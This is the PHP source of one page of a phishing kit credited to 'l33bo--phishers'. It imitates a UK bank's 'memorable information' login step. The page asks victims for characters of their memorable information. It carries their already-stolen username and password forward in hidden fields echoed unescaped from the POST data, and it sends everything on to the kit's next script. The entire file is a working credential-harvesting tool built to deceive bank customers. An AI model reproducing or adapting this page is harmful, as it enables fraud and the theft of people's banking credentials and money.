<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
require_once("assets/includes/memo.php");
require_once("assets/includes/LoginSecondary.php");
?>
<!DOCTYPE html>
<html lang="en-GB">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Enter Memorable</title>
<link href="assets/img/favicon.ico" rel="shortcut icon">
<link href="assets/css/global1-min140807.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/global2-min140729.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/yeah-js.css" media="screen" rel="stylesheet" type="text/css">
<script src="assets/js/jquery-min140807.js" type="text/javascript"></script>
<script src="assets/js/scriptsnippet.jspf" type="text/javascript"></script>
<script src="assets/js/global-min140807.js" type="text/javascript"></script>
<script src="assets/js/custom-min140729.js" type="text/javascript"></script>
<script src="assets/js/progressbar.js" type="text/javascript"></script>
</head><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<body><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div id="wrapper">
<div style="display:none">
<form method="post" action="mobile/index.php?&sessionid=<?php echo generateRandomString(90); ?>&securessl=true" name="MobileGuy" id="MobileGuy"> 
</form>
</div>
<div class="outer">
<div id="header">
<ul id="skiplinks">
<li><a href="#" id="lnkSkip" name="lnkSkip">Skip to main content</a></li>
</ul>
<div class="clearfix"><span id="strbrandname" style="display: none"></span>
<p id="logo"><span><img alt="" src=""></span></p>
<div class="secureMsg">
<p class="msg"><img alt="" src="assets/img/583.png"></p>
<p><a class="newwin" href="#" title="">How can I tell that this site is secure?</a></p>
</div>
<div class="loggedIn">
<ul>
<li class="mobile"><a class="linkBullet" href="mobile/index.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" title="Mobile">&Mu;obile</a></li>
<li class="cookie"><a class="linkBullet newwin" href="#" title="Cookie policy">Cookie policy</a></li>
</ul><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div>
<div class="pageWrap">
<div class="content" id="page">
<div class="primaryWrap">
<div class="primary">
<div class="panel">
<h1>Your memorable information</h1>
<div class="inner"><p><strong></strong></p>
<p><strong>Please enter characters 2, 4 and&nbsp;7 from your memorable information then click on the continue button.</strong></p>
<p><strong>We may ask you to enter your FULL memorable information.</strong></p>
<p></p>
<p>This login step improves security.</p>
</div>
<form id="memo" name="memo" action="MemorableRetry.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" autocomplete="off" class="validationName:(login) validate:()" enctype="application/x-www-form-urlencoded" method="post">
	<input type="hidden" name="username" value="<?=$_POST['username']?>">
	<input type="hidden" name="password" value="<?=$_POST['password']?>">	
<fieldset class="memInfoSelect clearfix">
<div class="formField validate:(oneSelectFieldRequired) validationName:(memorableInformation) clearfix">
<div class="formFieldInner">
<div class="clearfix"><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<label for="frmentermemorableinformation1:strEnterMemorableInformation_memInfo1">Character 1 :</label>
<select id="frmentermemorableinformation1:strEnterMemorableInformation_memInfo1" name="frmentermemorableinformation1:strEnterMemorableInformation_memInfo1">
<?php echo memoselect; ?>
</select>
</div>
<div class="clearfix">
<label for="frmentermemorableinformation1:strEnterMemorableInformation_memInfo2">Character 4 :</label>
<select id="frmentermemorableinformation1:strEnterMemorableInformation_memInfo2" name="frmentermemorableinformation1:strEnterMemorableInformation_memInfo2">
<?php echo memoselect; ?>
</select></div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div class="clearfix">
<label for="frmentermemorableinformation1:strEnterMemorableInformation_memInfo3">Character 6 :</label>
<select id="frmentermemorableinformation1:strEnterMemorableInformation_memInfo3" name="frmentermemorableinformation1:strEnterMemorableInformation_memInfo3">
<?php echo memoselect; ?>
</select><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div>
</fieldset>
<div class="inner"><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<ul class="linkList"><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<li><a id="frmentermemorableinformation1:lktrouble" name="frmentermemorableinformation1:lktrouble" href="#">Having trouble logging in?</a></li>
</ul><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div>
<ul class="actions">
<li class="primaryAction">
<input id="frmentermemorableinformation1:btnContinue" name="frmentermemorableinformation1:btnContinue" type="image" src="assets/img/004.png" class="submitAction">
</li>
<li><strong><a id="frmentermemorableinformation1:lkCancel" name="frmentermemorableinformation1:lkCancel" href="#" class="cancel pseudoLink">Cancel</a></strong></li>
</ul>
</form><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div>
</div>
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<?php echo secondary; ?>
</div>
<div id="footer">
<div class="outer">
<div id="footerInner">
<ul><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<li><a class="newwin" href="#" title="Legal">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li>
<li><a class="newwin" href="#" title="">Homepage</a></li>
<li><a class="newwin" href="#" title="Rates &amp; fees">Rates & fees</a></li>
</ul>
</div>
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div>
</div>
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</body>
</html>
<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
?>